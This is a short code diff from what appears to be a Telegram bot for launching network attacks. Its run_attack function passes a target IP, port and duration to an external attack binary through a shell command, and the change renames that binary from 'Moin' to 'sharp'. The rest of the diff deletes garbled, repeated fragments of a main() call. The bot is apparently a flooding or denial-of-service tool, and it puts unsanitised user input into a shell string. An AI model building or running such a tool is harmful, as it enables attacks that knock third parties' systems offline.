@@ -167,7 +167,7 @@ async def papa_bol(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./Moin {ip} {port} {duration} 877",
+            f"./sharp {ip} {port} {duration} 877",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -423,24 +423,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-in()
-nning.")
-
-if __name__ == '__main__':
-    main()
-in()
- logger.info("Bot is running.")
-
-if __name__ == '__main__':
-    main()
-in()
-
-    application.run_polling()
-    logger.info("Bot is running.")
-
-if __name__ == '__main__':
-    main()
-in()
-__':
-    main()
-in()
